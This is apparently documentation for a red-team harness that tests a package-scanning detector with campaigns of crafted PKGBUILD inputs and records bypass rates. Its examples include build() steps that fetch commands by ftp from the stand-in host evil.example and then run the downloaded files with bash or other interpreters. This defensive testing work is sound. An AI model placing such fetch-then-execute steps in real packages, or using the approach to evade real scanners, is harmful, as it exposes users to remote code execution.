---
description: Configure campaign.yml, choose a generator, declare constraints, and pre-register stop conditions.
---

# Writing a Campaign

A campaign is a directory under `campaigns/` containing `campaign.yml` and the
assets the generator needs. The directory is the unit of pre-registration:
`attempts`, cost ceiling, and stop conditions are committed before the run so
that post-hoc attempt-count shopping is visible in git history.

## Name it once, in kebab-case

`campaign` must be the directory name, lowercase kebab-case, unique in
`campaigns/`, and the same string in `record.json`. The regression report, the
coverage map and the MCP surface all address a campaign by that one name, so a
field that disagrees with its directory is an address that resolves to two
things. `tests/test_campaign_naming.py` enforces it.

## Minimal deterministic campaign

```yaml
campaign: my-first-campaign
campaign_type: deterministic

environment:
  trustsight_version: "0.17.4"
  trustsight_source: "local-path"
  db_state: "cold"
  flag_threshold: 20

generator:
  type: inputs

prompt:
  prompt_id: fetch-then-execute
  behavior_goal: fetch_then_execute
  expected_rules: ["R001", "R002"]
  forbidden_techniques: {}

attempts: 10
```

The generator reads `campaigns/my-first-campaign/inputs.yml`: one strict
manifest whose `cells` are the recipes, in attempt order. Each cell is diffed
against `defaults/baseline.PKGBUILD` and run through the pipeline.

```yaml
# inputs.yml - a cell with no shared skeleton carries the whole recipe
cells:
  - id: heredoc-ftp
    text: |
      pkgname=harness-baseline
      pkgver=1.0.1
      build() {
        ftp -n evil.example < cmds.txt
        bash stage.sh
      }
```

When the recipes share a skeleton, add `template: template.PKGBUILD` and give
each cell `vars` instead. A template is a recipe with `@@name@@` tokens:

```yaml
# inputs.yml
template: template.PKGBUILD
cells:
  - id: ftp-fennel
    vars: {fetch: 'ftp -n evil.example < cmds.txt', sink: 'fennel f.erl'}
  - id: ftp-bash
    vars: {fetch: 'ftp -n evil.example < cmds.txt', sink: 'bash f.erl'}
```

```
# template.PKGBUILD
build() {
  @@fetch@@
  @@sink@@
}
```

Rendering is a single-pass literal substitution: no expressions, no loops, no
filters, no attribute access. A missing placeholder, an unused variable, an
unknown key or a duplicate cell id is a configuration error, not a guess.
`template` is resolved under the campaign root and `baseline` under the
repository root; both are refused if they escape. Use
`python -m harness campaigns/<name> --dump-inputs <dir>` to render every cell
to a file for review.

## Choose the campaign type

| Type | Use when | Record implications |
|---|---|---|
| `deterministic` | Every attempt is a committed input; replay produces the same diff hashes. | Verdicts are reproducible for the pinned triple. |
| `stochastic` | LLM or mutation generator; output varies between runs. | Bypass rate is a binomial proportion with Wilson interval. |

A deterministic generator with `environment.accumulate: true` is still
stochastic for verdict purposes, because the database state depends on run
order.

## Declare constraints explicitly

`prompt.forbidden_techniques` is required. Use `{}` for an unconstrained
campaign, but declare it so the record says so. A forbidden technique without a
matching checker is a configuration error; the harness will not run.

## Pre-register stop conditions

```yaml
stop_conditions:
  bypasses: 5
  wall_clock_seconds: 3600
```

Stopping early is recorded in `record.json` under `stop_reason`. Because the
condition is in `campaign.yml`, the decision to stop is part of the committed
configuration, not a judgement made while watching results.

## Generators

- **inputs**; the committed `inputs.yml` manifest, fully deterministic.
- **mutation**; semantic-preserving variations of committed bypasses.
- **llm**; OpenAI-compatible provider, with a mandatory `max_cost_usd` ceiling.

See [Campaign Configuration](../reference/campaign-config.md) for the complete
key reference.
